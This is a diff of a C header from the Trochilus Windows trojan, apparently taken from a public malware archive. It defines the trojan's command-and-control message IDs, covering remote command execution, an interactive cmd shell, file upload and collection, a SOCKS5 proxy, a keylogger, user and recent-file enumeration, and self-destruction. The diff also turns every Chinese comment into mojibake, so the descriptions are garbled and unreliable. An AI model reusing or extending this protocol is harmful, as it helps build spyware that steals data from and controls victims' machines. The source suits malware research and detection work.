@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #pragma once
 
 #define MSGID UINT64
@@ -11,113 +22,113 @@
 #define MSGIDBASE 0LL
 
 #define MSGID_PULL_COMMAND							(MSGIDBASE + 1LL)
-//desc: À­È¡¿ØÖÆÃüÁî
+//desc: ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 #define MSGID_NO_COMMAND							(MSGIDBASE + 2LL)
-//desc: ·þÎñ¶Ë±íÊ¾Ã»ÓÐ×îÐÂµÄÃüÁî
+//desc: ï¿½ï¿½ï¿½ï¿½Ë±ï¿½Ê¾Ã»ï¿½ï¿½ï¿½ï¿½ï¿½Âµï¿½ï¿½ï¿½ï¿½ï¿½
 
 #define MSGID_REPLY_COMMAND							(MSGIDBASE + 3LL)
-//desc: ¿Í»§¶ËÓ¦´ð·þÎñÆ÷µÄÏûÏ¢ºÅ
+//desc: ï¿½Í»ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½
 
 #define MSGID_LIST_MOD								(MSGIDBASE + 4LL)
-//desc: ÁÐÈ¡ÒÑ¾­¼ÓÔØµÄÄ£¿é
+//desc: ï¿½ï¿½È¡ï¿½Ñ¾ï¿½ï¿½ï¿½ï¿½Øµï¿½Ä£ï¿½ï¿½
 //ret:
-//	mods	str		Ä£¿éÃû³Æ
+//	mods	str		Ä£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 #define MSGID_SET_DEFAULT_COMMNAME					(MSGIDBASE + 5LL)
-//desc: ÉèÖÃÄ¬ÈÏµÄÍ¨ÐÅ·½Ê½
+//desc: ï¿½ï¿½ï¿½ï¿½Ä¬ï¿½Ïµï¿½Í¨ï¿½Å·ï¿½Ê½
 //param:
-//	commname	str	(¿ÉÑ¡)http,dns
+//	commname	str	(ï¿½ï¿½Ñ¡)http,dns
 //ret:
-//	commname	str	µ±Ç°µÄÄ¬ÈÏÍ¨ÐÅ·½Ê½
+//	commname	str	ï¿½ï¿½Ç°ï¿½ï¿½Ä¬ï¿½ï¿½Í¨ï¿½Å·ï¿½Ê½
 
 #define MSGID_DOWNLOAD_FILE							(MSGIDBASE + 6LL)
-//desc: ¿Í»§¶Ë´ÓÏûÏ¢ÖÐ»ñÈ¡ÎÄ¼þÄÚÈÝ
+//desc: ï¿½Í»ï¿½ï¿½Ë´ï¿½ï¿½ï¿½Ï¢ï¿½Ð»ï¿½È¡ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½
 //param:
-//	localfile	str	·þÎñ¶ËÎÄ¼þ
-//	targetfile	str	¿Í»§¶ËÎÄ¼þ
+//	localfile	str	ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
+//	targetfile	str	ï¿½Í»ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
 
 //#define MSGID_FILE_EXISTS							(MSGIDBASE + 7LL)
-//desc: ¿Í»§¶ËÅÐ¶ÏÄ³¸öÎÄ¼þ»òÄ¿Â¼ÊÇ·ñ´æÔÚ
+//desc: ï¿½Í»ï¿½ï¿½ï¿½ï¿½Ð¶ï¿½Ä³ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½Ä¿Â¼ï¿½Ç·ï¿½ï¿½ï¿½ï¿½
 //param:
-//	filepath	str	ÎÄ¼þ¾ø¶ÔÂ·¾¶
+//	filepath	str	ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½Â·ï¿½ï¿½
 //ret:
-//	exists		uint64	boolÊÇ·ñ´æÔÚ
-//	isdir		uint64	boolÊÇ·ñÊÇÄ¿Â¼
+//	exists		uint64	boolï¿½Ç·ï¿½ï¿½ï¿½ï¿½
+//	isdir		uint64	boolï¿½Ç·ï¿½ï¿½ï¿½Ä¿Â¼
 
 #define MSGID_LIST_FILES							(MSGIDBASE + 8LL)
-//desc: ¿Í»§¶ËÁÐÈ¡Ä³¸öÎÄ¼þÄ¿Â¼
+//desc: ï¿½Í»ï¿½ï¿½ï¿½ï¿½ï¿½È¡Ä³ï¿½ï¿½ï¿½Ä¼ï¿½Ä¿Â¼
 //param:
-//	findstr		str	²éÕÒ×Ö·û´®
+//	findstr		str	ï¿½ï¿½ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ï¿½
 //ret:
-//	result		str	Ä¿Â¼ÄÚÈÝ	filename(str)|attr(dword)|filesize(uint64)|lastWriteTime(uint64 filetime):
+//	result		str	Ä¿Â¼ï¿½ï¿½ï¿½ï¿½	filename(str)|attr(dword)|filesize(uint64)|lastWriteTime(uint64 filetime):
 
 //#define MSGID_MOVE_FILE								(MSGIDBASE + 9LL)
-//desc: ¿Í»§¶ËÒÆ¶¯ÎÄ¼þ
+//desc: ï¿½Í»ï¿½ï¿½ï¿½ï¿½Æ¶ï¿½ï¿½Ä¼ï¿½
 //param:
-//	src			str	Ô­ÎÄ¼þ
-//	dest		str	Ä¿±êÎÄ¼þ 
+//	src			str	Ô­ï¿½Ä¼ï¿½
+//	dest		str	Ä¿ï¿½ï¿½ï¿½Ä¼ï¿½ 
 //ret:
-//	result		uint64	boolÊÇ·ñ³É¹¦
+//	result		uint64	boolï¿½Ç·ï¿½É¹ï¿½
 
 //#define MSGID_COPY_FILE								(MSGIDBASE + 10LL)
-//desc: ¿Í»§¶Ë¸´ÖÆÎÄ¼þ
+//desc: ï¿½Í»ï¿½ï¿½Ë¸ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
 //param:
-//	src			str	Ô­ÎÄ¼þ
-//	dest		str	Ä¿±êÎÄ¼þ
+//	src			str	Ô­ï¿½Ä¼ï¿½
+//	dest		str	Ä¿ï¿½ï¿½ï¿½Ä¼ï¿½
 //ret:
-//	result		uint64	boolÊÇ·ñ³É¹¦
+//	result		uint64	boolï¿½Ç·ï¿½É¹ï¿½
 
 //#define MSGID_DELETE_FILE							(MSGIDBASE + 11LL)
-//desc: ¿Í»§¶ËÉ¾³ýÎÄ¼þ
+//desc: ï¿½Í»ï¿½ï¿½ï¿½É¾ï¿½ï¿½ï¿½Ä¼ï¿½
 //param:
-//	dest		str	Ä¿±êÎÄ¼þ
+//	dest		str	Ä¿ï¿½ï¿½ï¿½Ä¼ï¿½
 //ret:
-//	result		uint64	boolÊÇ·ñ³É¹¦
+//	result		uint64	boolï¿½Ç·ï¿½É¹ï¿½
 
 #define MSGID_DISKS									(MSGIDBASE + 12LL)
-//desc: ÁÐÈ¡¿Í»§¶ËµÄ´ÅÅÌ·ÖÇø
+//desc: ï¿½ï¿½È¡ï¿½Í»ï¿½ï¿½ËµÄ´ï¿½ï¿½Ì·ï¿½ï¿½ï¿½
 //param:
 //ret:
-//	result		str	·ÖÇøÄÚÈÝ partition(str)|drivertype(uint)|totalbytes(uint64)|freebytes(uint64):
+//	result		str	ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ partition(str)|drivertype(uint)|totalbytes(uint64)|freebytes(uint64):
 
 //#define MSGID_EXECUTE_CMDLINE						(MSGIDBASE + 13LL)
-//desc: Ö´ÐÐ¿Í»§¶ËµÄ³ÌÐò
+//desc: Ö´ï¿½Ð¿Í»ï¿½ï¿½ËµÄ³ï¿½ï¿½ï¿½
 //param:
-//	cmdline		str	ÃüÁîÐÐ
+//	cmdline		str	ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //ret:
-//	result		str	Ö´ÐÐ½á¹û
+//	result		str	Ö´ï¿½Ð½ï¿½ï¿½
 
 #define MSGID_REQUEST_REPORT_INFO					(MSGIDBASE + 14LL)
-//desc: ¿Í»§¶ËÉÏ±¨»ù±¾ÐÅÏ¢
+//desc: ï¿½Í»ï¿½ï¿½ï¿½ï¿½Ï±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢
 //param:
-//	cn			str	Ö÷»úÃû
-//	ip			str	ÓÃ¶ººÅ·Ö¸ôµÄ±¾»úIPÁÐ±í
-//	instime		uint64	±¾»ú°²×°Ê±¼ä
-//	os			uint64	²Ù×÷ÏµÍ³°æ±¾
-//	x64			uint64	ÊÇ·ñx64Æ½Ì¨
-//	mods		str ÓÃ¶ººÅ·Ö¸ôµÄ±¾»úÄ£¿éÃû³ÆÁÐ±í
+//	cn			str	ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+//	ip			str	ï¿½Ã¶ï¿½ï¿½Å·Ö¸ï¿½ï¿½Ä±ï¿½ï¿½ï¿½IPï¿½Ð±ï¿½
+//	instime		uint64	ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½×°Ê±ï¿½ï¿½
+//	os			uint64	ï¿½ï¿½ï¿½ï¿½ÏµÍ³ï¿½æ±¾
+//	x64			uint64	ï¿½Ç·ï¿½x64Æ½Ì¨
+//	mods		str ï¿½Ã¶ï¿½ï¿½Å·Ö¸ï¿½ï¿½Ä±ï¿½ï¿½ï¿½Ä£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð±ï¿½
 
 //#define MSGID_REDIRECT_EXEC							(MSGIDBASE + 15LL)
-//desc: ÔÚ¿Í»§¶ËÉÏÖ´ÐÐ³ÌÐò£¬²¢½øÐÐÊäÈëÊä³öÖØ¶¨Ïò
+//desc: ï¿½Ú¿Í»ï¿½ï¿½ï¿½ï¿½ï¿½Ö´ï¿½Ð³ï¿½ï¿½ò£¬²ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø¶ï¿½ï¿½ï¿½
 //param:
-//	cmd			str	ÃüÁîÐÐ
+//	cmd			str	ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //ret:
-//	pid			uint64	½ø³Ìpid¡£Èç¹ûÊÇ0£¬Ôò±íÊ¾Ê§°Ü
+//	pid			uint64	ï¿½ï¿½ï¿½ï¿½pidï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½0ï¿½ï¿½ï¿½ï¿½ï¿½Ê¾Ê§ï¿½ï¿½
 
 //#define MSGID_REDIRECT_INPUT						(MSGIDBASE + 16LL)
-//desc: Ïò¿Í»§¶ËµÄ½ø³Ì½øÐÐÊäÈë
+//desc: ï¿½ï¿½Í»ï¿½ï¿½ËµÄ½ï¿½ï¿½Ì½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //param:
-//	pid			uint64	½ø³Ìpid
-//	in			str		ÊäÈëÊý¾Ý
+//	pid			uint64	ï¿½ï¿½ï¿½ï¿½pid
+//	in			str		ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //ret:
-//	active		uint64	½ø³ÌÊÇ·ñ»¹´æÔÚ
-//	out			str		½ø³ÌµÄÊä³ö
+//	active		uint64	ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ñ»¹´ï¿½ï¿½ï¿½
+//	out			str		ï¿½ï¿½ï¿½Ìµï¿½ï¿½ï¿½ï¿½
 
 //#define MSGID_REDIRECT_CLOSE						(MSGIDBASE + 17LL)
-//desc: ½áÊø¿Í»§¶ËµÄÖØ¶¨Ïò½ø³Ì
+//desc: ï¿½ï¿½ï¿½ï¿½ï¿½Í»ï¿½ï¿½Ëµï¿½ï¿½Ø¶ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //param:
-//	pid			uint64	½ø³Ìpid
+//	pid			uint64	ï¿½ï¿½ï¿½ï¿½pid
 
 
 
@@ -125,57 +136,57 @@
 
 
 #define MSGID_CMDREDIRECT_OPEN						(MSGIDBASE + 18LL)
-//desc: ServerÒªÇó¿Í»§¶Ë´ò¿ªcmd½ø³Ì
+//desc: ServerÒªï¿½ï¿½Í»ï¿½ï¿½Ë´ï¿½cmdï¿½ï¿½ï¿½ï¿½
 //ret:
 //	result		uint64	TRUE/FALSE
 
 #define MSGID_CMDREDIRECT_INPUT						(MSGIDBASE + 19LL)
-//desc: ·þÎñ¶ËÏò¿Í»§¶ËµÄcmd½øÐÐÊäÈë
+//desc: ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í»ï¿½ï¿½Ëµï¿½cmdï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //param:
-//	input		str		ÊäÈë
-//	rn			uint64	ÊÇ·ñÔÚºóÃæ²¹ÉÏ\r\n
+//	input		str		ï¿½ï¿½ï¿½ï¿½
+//	rn			uint64	ï¿½Ç·ï¿½ï¿½Úºï¿½ï¿½æ²¹ï¿½ï¿½\r\n
 //ret:
 //	result		uint64	TRUE/FALSE
 
 #define MSGID_CMDREDIRECT_OUTPUT					(MSGIDBASE + 20LL)
-//desc: ¿Í»§¶ËÏòserver·µ»ØcmdµÄÊä³ö
+//desc: ï¿½Í»ï¿½ï¿½ï¿½ï¿½ï¿½serverï¿½ï¿½ï¿½ï¿½cmdï¿½ï¿½ï¿½ï¿½ï¿½
 //param:
-//	bytedata Êä³ö
+//	bytedata ï¿½ï¿½ï¿½
 
 #define MSGID_CMDREDIRECT_CLOSE						(MSGIDBASE + 21LL)
-//desc: ½áÊø¿Í»§¶ËµÄcmdÖØ¶¨Ïò½ø³Ì
+//desc: ï¿½ï¿½ï¿½ï¿½ï¿½Í»ï¿½ï¿½Ëµï¿½cmdï¿½Ø¶ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //param:
 //	result		uint64	TRUE/FALSE
 
 #define MSGID_UPLOAD_FILE							(MSGIDBASE + 22LL)
-//desc: ¿Í»§¶Ë½«Ö¸¶¨µÄÎÄ¼þ·ÅÔÚÏûÏ¢ÖÐ½øÐÐÉÏ´«
+//desc: ï¿½Í»ï¿½ï¿½Ë½ï¿½Ö¸ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½Ð½ï¿½ï¿½ï¿½ï¿½Ï´ï¿½
 //param:
-//	remotefile	str	¿Í»§¶ËµÄÎÄ¼þ
+//	remotefile	str	ï¿½Í»ï¿½ï¿½Ëµï¿½ï¿½Ä¼ï¿½
 
 
 #define MSGID_AVAILABLE_COMM						(MSGIDBASE + 23LL)
-//desc: ¿Í»§¶ËÍ¨¹ý´ËÏûÏ¢À´Ì½²âÐÅµÀÊÇ·ñ¿ÉÓÃ£¬¿Í»§¶Ë·¢ËÍ£¬·þÎñÆ÷»ØÓ¦
+//desc: ï¿½Í»ï¿½ï¿½ï¿½Í¨ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½Ì½ï¿½ï¿½ï¿½Åµï¿½ï¿½Ç·ï¿½ï¿½ï¿½Ã£ï¿½ï¿½Í»ï¿½ï¿½Ë·ï¿½ï¿½Í£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¦
 //param:
 //	commname	uint64
 //ret:
 //	commname	uint64
 
 #define MSGID_SET_FILESERVER_LIST					(MSGIDBASE + 24LL)
-//desc: ÉèÖÃ¿Í»§¶ËµÄÎÄ¼þ·þÎñÆ÷ÁÐ±í
+//desc: ï¿½ï¿½ï¿½Ã¿Í»ï¿½ï¿½Ëµï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð±ï¿½
 //param:
 //	url			str		http://192.168.0.250/file.php,http://192.168.0.251/file.php
 
 #define MSGID_COLLECT_FILE							(MSGIDBASE + 25LL)
-//desc: ·þÎñ¶ËÒªÇó¿Í»§¶Ë½øÐÐÎÄ¼þÊÕ¼¯
+//desc: ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½Í»ï¿½ï¿½Ë½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Õ¼ï¿½
 //param:
 //	filepath		str		c:\windows\calc.exe
-//	blockcount		uint64	Ã¿Ò»¿éµÄ´óÐ¡,64kµÄ±¶ÊýÖµ
-//	intervaltime	uint64	Êý¾Ý¿é·¢ËÍ¼ä¸ôÊ±¼ä(ºÁÃë)
+//	blockcount		uint64	Ã¿Ò»ï¿½ï¿½Ä´ï¿½Ð¡,64kï¿½Ä±ï¿½ï¿½ï¿½Öµ
+//	intervaltime	uint64	ï¿½ï¿½ï¿½Ý¿é·¢ï¿½Í¼ï¿½ï¿½Ê±ï¿½ï¿½(ï¿½ï¿½ï¿½ï¿½)
 //ret:
-//	fileid		str		ÎÄ¼þid
+//	fileid		str		ï¿½Ä¼ï¿½id
 
 //#define MSGID_COLLECT_FILE_BODY						(MSGIDBASE + 26LL)
-//desc: ·þÎñ¶ËÒªÇó¿Í»§¶ËÊÕ¼¯²¿·ÖÎÄ¼þ
+//desc: ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½Í»ï¿½ï¿½ï¿½ï¿½Õ¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
 //param:
 //	fileid		str		
 //	filepath	str
@@ -183,25 +194,25 @@
 //	size		uint64
 
 #define MSGID_QUERY_COLLECTING_FILE					(MSGIDBASE + 27LL)
-//desc: ·þÎñ¶Ë²éÑ¯¿Í»§¶ËÕýÔÚ½øÐÐµÄÎÄ¼þ´«ÊäÈÎÎñ
+//desc: ï¿½ï¿½ï¿½ï¿½Ë²ï¿½Ñ¯ï¿½Í»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ú½ï¿½ï¿½Ðµï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //param:
 //ret:
 //	filepathlist	str		c:\windows\calc.exe,c:\windows\	
 
 #define MSGID_ABORT_COLLECT_FILE					(MSGIDBASE + 28LL)
-//desc: È¡ÏûÕýÔÚ½øÐÐµÄÎÄ¼þ´«Êä
+//desc: È¡ï¿½ï¿½ï¿½ï¿½ï¿½Ú½ï¿½ï¿½Ðµï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½
 //param:
 //	fileid		str	
 
 #define MSGID_INSTALL_MODULE						(MSGIDBASE + 29LL)
-//desc: ·þÎñ¶ËÏò¿Í»§¶Ë²¿Êð¹¦ÄÜÄ£¿é
+//desc: ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í»ï¿½ï¿½Ë²ï¿½ï¿½ï¿½ï¿½ï¿½Ä£ï¿½ï¿½
 //param:
-//	modname		str			Ä£¿éÎÄ¼þÃû³Æ
+//	modname		str			Ä£ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½
 
 
 
 #define MSGID_QUERY_START_SOCKS5				(MSGIDBASE + 30LL)
-//desc: ´ò¿ªÔ¶³Ì¿Í»§¶Ësocks5´úÀí
+//desc: ï¿½ï¿½Ô¶ï¿½Ì¿Í»ï¿½ï¿½ï¿½socks5ï¿½ï¿½ï¿½ï¿½
 //param:
 //reverseip str
 //password str
@@ -209,48 +220,48 @@
 //port uint64
 
 #define MSGID_QUERY_STOP_SOCKS5				(MSGIDBASE + 31LL)
-//desc: ¹Ø±ÕÔ¶³Ì¿Í»§¶Ësocks5´úÀí
+//desc: ï¿½Ø±ï¿½Ô¶ï¿½Ì¿Í»ï¿½ï¿½ï¿½socks5ï¿½ï¿½ï¿½ï¿½
 //param:
 
 #define MSGID_SELF_DESTRUCTION					(MSGIDBASE + 32LL)
-//desc: ·þÎñ¶ËÏò¿Í»§¶Ë·¢ËÍÖ¸Áî,½øÐÐ×Ô»Ù
+//desc: ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í»ï¿½ï¿½Ë·ï¿½ï¿½ï¿½Ö¸ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½ï¿½Ô»ï¿½
 //param:
 
 #define MSGID_QUERY_START_KEYLOGGER			(MSGIDBASE + 33LL)
-//desc: ´ò¿ªÔ¶³Ì¿Í»§¶Ë¼üÅÌ¼ÇÂ¼
+//desc: ï¿½ï¿½Ô¶ï¿½Ì¿Í»ï¿½ï¿½Ë¼ï¿½ï¿½Ì¼ï¿½Â¼
 //param:
-//logpath str		±£´æÂ·¾¶
-//maxsize uint64	±£´æµÄÎÄ¼þ×î´ó´óÐ¡,µ¥Î»×Ö½Ú
+//logpath str		ï¿½ï¿½ï¿½ï¿½Â·ï¿½ï¿½
+//maxsize uint64	ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½Ð¡,ï¿½ï¿½Î»ï¿½Ö½ï¿½
 
 #define MSGID_QUERY_STOP_KEYLOGGER			(MSGIDBASE + 34LL)
-//desc: ¹Ø±ÕÔ¶³Ì¿Í»§¶Ë¼üÅÌ¼ÇÂ¼
+//desc: ï¿½Ø±ï¿½Ô¶ï¿½Ì¿Í»ï¿½ï¿½Ë¼ï¿½ï¿½Ì¼ï¿½Â¼
 //param:
 
 #define MSGID_MAKE_CLIENT_UPLOAD_PROGRESS	(MSGIDBASE + 35LL)
-//desc: ¿Í»§¶ËÍ¨Öª·þÎñ¶ËÎÄ¼þ, ÎÄ¼þ´«ÊäµÄ½ø¶È
+//desc: ï¿½Í»ï¿½ï¿½ï¿½Í¨Öªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½, ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½Ä½ï¿½ï¿½ï¿½
 //param:
-//	msgserial uint64	ÏûÏ¢ÐòÁÐºÅ
-//	cpserial uint64		CPÐ­ÒéµÄ´«ÊäÐòÁÐºÅ
-//	totalsize uint64	ÎÄ¼þ×Ü´óÐ¡
+//	msgserial uint64	ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½Ðºï¿½
+//	cpserial uint64		CPÐ­ï¿½ï¿½Ä´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ðºï¿½
+//	totalsize uint64	ï¿½Ä¼ï¿½ï¿½Ü´ï¿½Ð¡
 
 #define MSGID_QUERY_LOGON_USERS				(MSGIDBASE + 36LL)
-//desc: ·þÎñ¶Ë²éÑ¯¿Í»§¶Ëµ±Ç°µÇÂ¼ÓÃ»§Ãû
+//desc: ï¿½ï¿½ï¿½ï¿½Ë²ï¿½Ñ¯ï¿½Í»ï¿½ï¿½Ëµï¿½Ç°ï¿½ï¿½Â¼ï¿½Ã»ï¿½ï¿½ï¿½
 //param:
 //ret:
 //	result	str		true/false
-//	users	str		¶ººÅ·Ö¸ôµÄÓÃ»§»á»°ÐÅÏ¢ username|sessionid|state|stationname,
+//	users	str		ï¿½ï¿½ï¿½Å·Ö¸ï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½á»°ï¿½ï¿½Ï¢ username|sessionid|state|stationname,
 
 #define MSGID_QUERY_MRU_FILE				(MSGIDBASE + 37LL)
-//desc: ·þÎñ¶Ë²éÑ¯¿Í»§¶Ë×î½ü·ÃÎÊÎÄ¼þÐÅÏ¢
+//desc: ï¿½ï¿½ï¿½ï¿½Ë²ï¿½Ñ¯ï¿½Í»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½Ï¢
 //param:
-//	aftertime	uint64	»ñÈ¡ÔÚÕâ¸öÊ±¼äÖ®ºóµÄÊý¾Ý
-//	checkexists	uint64	ÊÇ·ñ¼ì²éÎÄ¼þÊÇ·ñ´æÔÚ
+//	aftertime	uint64	ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½Ö®ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+//	checkexists	uint64	ï¿½Ç·ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ç·ï¿½ï¿½ï¿½ï¿½
 //ret:
-//	result	str		Êý¾Ý:"ÎÄ¼þÂ·¾¶?ÎÄ¼þ×´Ì¬(0-Î´Öª,1-´æÔÚ,2-²»´æÔÚ)?×îºóÐÞ¸ÄÊ±¼ä",ÀýÈç: c:\a.txt?0?1231211|d:\b.doc?1?1232122
+//	result	str		ï¿½ï¿½ï¿½ï¿½:"ï¿½Ä¼ï¿½Â·ï¿½ï¿½?ï¿½Ä¼ï¿½×´Ì¬(0-Î´Öª,1-ï¿½ï¿½ï¿½ï¿½,2-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½)?ï¿½ï¿½ï¿½ï¿½Þ¸ï¿½Ê±ï¿½ï¿½",ï¿½ï¿½ï¿½ï¿½: c:\a.txt?0?1231211|d:\b.doc?1?1232122
 #define MSGID_UNINSTALL_MODULE						(MSGIDBASE + 38LL)
-//desc: ·þÎñ¶ËÏò¿Í»§¶Ë²¿Êð¹¦ÄÜÄ£¿é
+//desc: ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í»ï¿½ï¿½Ë²ï¿½ï¿½ï¿½ï¿½ï¿½Ä£ï¿½ï¿½
 //param:
-//	modname		str			Ä£¿éÎÄ¼þÃû³Æ
+//	modname		str			Ä£ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½
 #define MSGID_DELETE_SERIALID						(MSGIDBASE + 39LL)
 
 #define MSGID_GET_FILE						(MSGIDBASE + 40LL)
